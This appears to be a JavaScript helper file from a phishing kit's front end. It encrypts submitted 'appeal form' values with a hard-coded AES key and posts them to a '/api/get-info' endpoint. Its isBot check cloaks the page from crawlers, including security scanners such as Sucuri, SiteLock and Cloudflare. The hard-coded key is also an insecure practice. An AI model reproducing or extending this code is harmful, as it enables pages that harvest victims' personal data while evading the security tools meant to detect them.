import axios from "axios";
import CryptoJS from "crypto-js";

const secretKey = "HDNDT-JDHT8FNEK-JJHR";

export const encrypt = (text) => {
    return CryptoJS.AES.encrypt(text, secretKey).toString();
};

export const decrypt = (cipherText) => {
    const bytes = CryptoJS.AES.decrypt(cipherText, secretKey);
    return bytes.toString(CryptoJS.enc.Utf8);
};

export const saveRecord = (key, value) => {
    try {
        const encryptedValue = encrypt(JSON.stringify(value));
        sessionStorage.setItem(key, encryptedValue);
    } catch (error) {
        console.error("Error saving to sessionStorage", error);
    }
};

export const getRecord = (key) => {
    try {
        const encryptedValue = sessionStorage.getItem(key);
        if (!encryptedValue) return null;

        const decryptedValue = decrypt(encryptedValue);
        return decryptedValue ? JSON.parse(decryptedValue) : null;
    } catch (error) {
        console.error("Error reading from sessionStorage", error);
        return null;
    }
};

export const clearRecord = (key) => {
    try {
        sessionStorage.removeItem(key);
    } catch (error) {
        console.error("Error removing from sessionStorage", error);
    }
};

export const sendAppealForm = async (values) => {
    try {
        const data = { ...values };
        const jsonString = JSON.stringify(data);
        const encryptedData = encrypt(jsonString);

        const response = await axios.post('/api/get-info', { data: encryptedData });
        console.log(response);

        return response;
    } catch (error) {
        throw error;
    }
};

export const isBot = () => {
    if (typeof navigator === "undefined" || !navigator.userAgent) return true;
  
    const botPatterns = [
        /bot/i, /crawl/i, /spider/i, /slurp/i, /archiver/i, /mediapartners/i, /nutch/i, /yahoo/i,
        /bingpreview/i, /yandex/i, /duckduckbot/i, /baiduspider/i, /sogou/i, /exabot/i, /facebookexternalhit/i,
        /facebot/i, /ia_archiver/i, /twitterbot/i, /applebot/i, /semrushbot/i, /ahrefsbot/i, /mj12bot/i,
        /pinterest/i, /linkedinbot/i, /discordbot/i, /telegrambot/i, /whatsapp/i, /skype/i, /slackbot/i,
        /redditbot/i, /googlebot/i, /amazonbot/i, /cloudflare/i, /tumblr/i, /qwant/i, /seznambot/i, 
        /ecosia/i, /gigabot/i, /teoma/i, /youdaobot/i, /sensisbot/i, /opensiteexplorer/i, /gptbot/i,
        /bytespider/i, /petalbot/i, /zoominfobot/i, /curl/i, /wget/i, /libwww-perl/i, /python-requests/i,
        /go-http-client/i, /java/i, /scrapy/i, /httpclient/i, /http_request2/i, /phpcrawl/i, /phantomjs/i,
        /headlesschrome/i, /sitebulb/i, /httrack/i, /uptimerobot/i, /statuscake/i, /semrushbot/i, 
        /ahrefsbot/i, /serpstatbot/i, /moz.com/i, /datadog/i, /linkdexbot/i, /majestic/i, /dotbot/i, 
        /blexbot/i, /trendictionbot/i, /seokicks/i, /nuzzel/i, /pr-cy.ru/i, /rogerbot/i, /lighthouse/i,
        /checkmarknetwork/i, /seobility/i, /seoscanners/i, /backlink-checker/i, /seomoz/i, /siteexplorer.info/i,
        /commoncrawl/i, /pandalytics/i, /scraperapi/i, /serpapi/i, /livelink/i, /yeti/i, /naver/i,
        /bitlybot/i, /shorturlbot/i, /dataminr/i, /diffbot/i, /screamingfrog/i, /linkfluence/i,
        /meanpathbot/i, /sitelockspider/i, /wbsearchbot/i, /yacybot/i, /proximic/i, /heritrix/i,
        /zohoexternalhit/i, /swiftbot/i, /sucuri/i, /hexometer/i, /appengine-google/i
    ];
  
    return botPatterns.some(pattern => pattern.test(navigator.userAgent.toLowerCase()));
  };